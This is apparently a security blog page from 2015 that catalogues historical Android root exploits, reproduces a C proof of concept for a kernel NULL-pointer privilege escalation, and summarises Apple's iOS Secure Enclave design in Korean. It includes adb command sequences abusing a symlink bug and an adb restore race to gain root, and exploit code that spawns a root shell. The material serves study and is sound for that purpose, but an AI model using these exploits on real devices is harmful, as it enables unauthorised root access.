+<h3>Acer Iconia - Exploiting SUID binaries</h3>
+
+<p>A SUID binary that is owned by root and world-executable is very high-value target for root exploit developers. If they discover any vulnerabilities in this binary that allow the execution of arbitary code, they will have gained root access on the device.
+This particular issue was discovered by an XDA Developers user named sc2k on the Acer Iconia A1000, which had a pre-installed SUID binary named cmdclient that was vulnerable to command injection. See the original post at <a href="http://forum.xda-developers.com/showthread.php?t=1138228">here</a>.</p>
+
+<h3>Master Key Bugs - Exploiting Android AOSP System Code</h3>
+
+<p><a href="http://www.saurik.com/id/17">here</a>
+<a href="http://www.cydiaimpactor.com">Cydia Impactor</a></p>
+
+<h3>TowelRoot</h3>
+
+<p><a href="http://www.all-things-android.com/content/android-and-linux-kernel-towelroot-exploit">here</a></p>
+
+<h3>Wunderbar/asroot</h3>
+
+<p>This bug was discovered by Tavis Ormandy and Julien Tinnes of the Google Security Team and was assigned CVE-2009-2692.</p>
+
+<p>The Linux kernel 2.6.0 through 2.6.30.4 and 2.4.4 through 2.4.37.4, does not initialize all function pointers for socket operations in proto_ops structures, which allows local users to trigger a NULL pointer dereference and gain privileges by using mmap to map page zero, placing arbitrary code on this page, and then invoking an unavailable operation, as demonstrated by the sendpage operation (sock_sendpage function) on a PF_PPPOX socket.</p>
+
+<p><a href="http://www.zenthought.org/content/file/android-root-2009-08-16-source">here</a></p>
+
+<h3>Recovery: Volez</h3>
+
+<p>A typographical error in the signature verifier used in Android 2.0 and 2.0.1 recovery images caused the recovery to incorrectly detect the End of Central Directory (EOCD) record inside a signed update.zip file. This issue resulted in the ability to modify the contents of a signed OTA recovery image.</p>
+
+<p><a href="http://zenthought.org/content/project/volez">here</a></p>
+
+<h3>Udev: Exploid</h3>
+
+<ul>
+<li>CVE-2009-1185</li>
+</ul>
+
+
+<h3>Adbd: RageAgainstTheCage</h3>
+
+<p><a href="http://stealth.openwall.net/xSports/RageAgainstTheCage.tgz">here</a></p>
+
+<h3>Zygote: Zimperlich and Zyysploit</h3>
+
+<p><a href="http://c-skills.blogspot.com.es/2011/02/zimperlich-sources.html">here</a>
+<a href="https://github.com/unrevoked/zysploit">here</a></p>
+
+<h3>Ashmem: KillingTheNameOf and psneuter</h3>
+
+<p><a href="http://c-skills.blogspot.com/2011/01/adb-trickery-again.html">here</a>
+<a href="https://github.com/tmzt/g2root-kmod/tree/scotty2/scotty2/psneuter">here</a></p>
+
+<h3>PowerVR: Ievitator</h3>
+
+<p><a href="http://jon.oberheide.org/files/levitator.c">here</a></p>
+
+<h3>Libsysutils: zergRush</h3>
+
+<p><a href="https://github.com/revolutionary/zergRush">here</a></p>
+
+<h3>Kernel: mempodroid</h3>
+
+<p>[here](<a href="https://github.com/saurik/mempoj">https://github.com/saurik/mempoj</a></p>
+
+<h3>File Permission and Symbolic Link-Related Attacks</h3>
+
+<p><a href="http://vulnfactory.org/blog/">here</a></p>
+
+<p>Initial versions of Android 4.0 had a bug in the init functions for do_chmod, mkdir, and do_chown
+that applied the ownership and file permissions specified even if the last element of their target
+path was a symbolic link. Some Android devices have the following line in their init.rc script.</p>
+
+<p><code>mkdir /data/local/tmp 0771 shell shell</code></p>
+
+<p>As you can guess now, if the /data/local folder is writeable by the user or group shell, you can
+exploit this flaw to make the /data folder writeable by replacing /data/local/tmp with a symbolic
+link to /data and rebooting the device. After rebooting, you can create or modify the /data/local.prop
+file to set the property <code>ro.kernel.qemu</code> to 1.</p>
+
+<p>The commands to exploit this flaw are as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>adb shell rm -r /data/local/tmp
+</span><span class='line'>adb shell ln -s /data/ /data/local/tmp
+</span><span class='line'>adb reboot
+</span><span class='line'>adb shell "echo 'ro.kernel.qemu=1' &gt; /data/local.prop"
+</span><span class='line'>adb reboot</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Another popular variant of this vulnerability links /data/local/tmp to the system partition and then
+uses debugfs to write the su binary and make it set-uid root. For example, the ASUS Transformer Prime
+running Android 4.0.3 is vulnerable to this variant.</p>
+
+<p>The init scripts in Android 4.2 apply <code>O_NOFOLLOW</code> semantics to prevent this calss of symbolic link attacks.</p>
+
+<h3>Adb Restore Race Condition</h3>
+
+<p>Android 4.0 introduced the ability to do full device backups through the adb backup command.
+This command backs up all data and applications into the file backup.ab, which is a compressed
+TAR file with a prepended header. The <code>adb restore</code> command is used to restore the data.</p>
+
+<p>There were two security issues in the initial implementation of the restore process that were
+fixed in Android 4.1.1. The first issue allowed creating files and directories accessible by other
+applications. The second issue allowed restoring file sets from packages that run under a special UID,
+such as system, without a special backup agent to handle the restore process.</p>
+
+<p>To exploit these issues, Andreas Makris (Bin4ry) created a specially crafted backup file with a world
+readble/writeable/executable directory containing 100 files with the content <code>ro.kernel.qemu=1</code> and
+<code>ro.secure=0</code> inside it. When the contents of this file are written to <code>/data/local.prop</code>, it makes
+<code>adbd</code> run with root privieges on boot.</p>
+
+<p><a href="http://forum.xda-developers.com/showthread.php?t=1886460">here</a></p>
+
+<p>The following one-liner, if executed while the <code>adb restore</code> command is running, causes a race between
+the restore process in the backup manager service and the while loop run by the <code>shell</code> user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If the loop creates the symbolic link in file99 before the restore process restores it, the restore
+process follows the symbolic link and writes the read-only system properties to /data/local.prop, making
+adbd run as root in the next reboot.</p>
+
+<h3>Exynos4: exynos-abuse</h3>
+
+<ul>
+<li><a href="http://forum.xda-developers.com/showthread.php?t=2048511">here</a></li>
+<li><a href="http://blog.azimuthsecurity.com/2013/02/revisiting-exynos-memory-mapping-bug.html">Framaroot</a></li>
+</ul>
+
+
+<h3>Diag: lit / diaggetroot</h3>
+
+<p>This vulnerability was discovered by giantpune and was assigned CVE identifier CVE-2012-4220:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>diagchar_core.c in the Qualcomm Innovation Center (QuIC) Diagnostics (aka DIAG) kernel-mode driver
+</span><span class='line'>for Android 2.3 through 4.2 allows attackers to execute arbitrary code or cause a 
+</span><span class='line'>denial of service (incorrect pointer dereference) via an application that uses crafted arguments in a
+</span><span class='line'>local diagchar_ioctl call.</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="https://docs.google.com/file/d/oB8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1">here</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/25/much-ado-about-null-exploiting/">Much Ado About Null Exploiting</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-25T00:06:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:06 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1">Much Ado About Null Exploiting</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;fcntl.h&gt;
+</span><span class='line'>
+</span><span class='line'>struct cred;
+</span><span class='line'>struct task_struct;
+</span><span class='line'>
+</span><span class='line'>typedef struct cred *(*prepare_kernel_cret_t)(struct task_struct *daemon) __attribute__((regparm(3)));
+</span><span class='line'>typedef int (*commit_creds_t)(struct cred *new) __attribute__((regparm(3)));
+</span><span class='line'>
+</span><span class='line'>prepare_kernel_cret_t prepare_kernel_cred;
+</span><span class='line'>commit_creds_t commit_creds;
+</span><span class='line'>
+</span><span class='line'>void *get_ksym(char *name) {
+</span><span class='line'>    FILE *f = fopen("/proc/kallsyms", "rb");
+</span><span class='line'>    char c,sym[512];
+</span><span class='line'>    void *addr;
+</span><span class='line'>    int ret;
+</span><span class='line'>    while (fscanf(f,"%p %c %s\n", &addr, &c, sym) &gt; 0)
+</span><span class='line'>        if (!strcmp(sym,name)) return addr;
+</span><span class='line'>    return NULL;
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>void get_root(void) { commit_creds(prepare_kernel_cred(0)); }
+</span><span class='line'>
+</span><span class='line'>int main() {
+</span><span class='line'>    prepare_kernel_cred = get_ksym("prepare_kernel_cred");
+</span><span class='line'>    commit_creds = get_ksym("commit_creds");
+</span><span class='line'>
+</span><span class='line'>    if (!prepare_kernel_cred || !commit_creds) {
+</span><span class='line'>        fprintf(stderr, "Kernel symbols not found.");
+</span><span class='line'>        exit(1);
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    mmap(0,4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+</span><span class='line'>    void (**fn)(void) = NULL;
+</span><span class='line'>    *fn = get_root;
+</span><span class='line'>
+</span><span class='line'>    int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
+</span><span class='line'>    write(fd, "1", 1);
+</span><span class='line'>    close(fd);
+</span><span class='line'>
+</span><span class='line'>    if (getuid() == 0) {
+</span><span class='line'>        char *argv[] = { "/bin/sh", NULL }
+</span><span class='line'>        execve("/bin/sh", argv, NULL);
+</span><span class='line'>    }
+</span><span class='line'>    fprintf(stderr, "Something went wrong.");
+</span><span class='line'>    return 1;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/24/ios-security-guide-ios-8-dot-3-or-later/">iOS Security Guide - iOS 8.3 or Later</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-24T14:07:16+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:07 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://www.apple.com/business/docs/iOS_Security_Guide.pdf">iOS Security Guide - iOS 8.3 or later</a></p>
+
+<p>Apple Watch 가 나오면서 저 문서가 update 되었다.</p>
+
+<ul>
+<li><a href="http://fromsiliconvalley.com/tag/secure-enclave/">Apple Shoots, Scores in Security. Quietly.</a></li>
+</ul>
+
+
+<h3>Secure Enclave</h3>
+
+<ul>
+<li><p>우선 ROM 에 Apple Certificate 이 박혀있어서, 애플이 서명한 컨텐츠를 검증할 수 있는데, ROM 에 박혀있기 때문에,
+손대는 것이 불가능.</p></li>
+<li><p>아이폰에는 Secure Enclave 라는 암호 코프로세서가 존재하는데, 이 안에 디바이스마다 유니크한 256-bit UID 가
+제작 과정에서 각인됨. 애플에 따르면 자기들도 기록해두지 않아서 모르고, 생산된 디바이스에서 UID 를 recover
+하는 것은 불가능. 아무도 모르는 유니크한 256-bit 가 코프로세서 안에 존재하는 셈.</p></li>
+<li><p>Secure Enclave 는 암호화 엔진을 가지고 있는데, 암호키를 만들때 유저가 입력한 패스워드에 UID 를 섞기
+때문에 고성능 FPGA 를 이용한 딕셔너리 공격이 어렵게 된다. Enc(사전에 나오는 단어+UID, Key) 를 돌려야하는데,
+UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아이폰에서만 복호화가 가능한 구조. 패스워드와 UID 를 섞는 과정은 80ms 가 걸리도록 튜닝되어있음.</p></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/posts/6">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/posts/4">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
